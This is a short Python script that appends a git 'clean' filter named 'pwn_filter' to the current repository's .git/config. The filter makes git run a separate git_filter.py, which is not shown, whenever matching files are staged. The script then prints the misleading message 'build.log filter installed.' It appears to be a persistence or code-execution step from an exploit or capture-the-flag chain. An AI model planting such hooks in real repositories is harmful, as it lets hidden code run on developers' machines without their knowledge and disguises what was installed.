import os

cwd = os.getcwd()
config_payload = f"""
[filter "pwn_filter"]
    clean = python3 {cwd}/git_filter.py
    smudge = cat
    required = true
"""

git_config_path = os.path.join(cwd, ".git", "config")
with open(git_config_path, "a") as f:
    f.write(config_payload)

print("build.log filter installed.")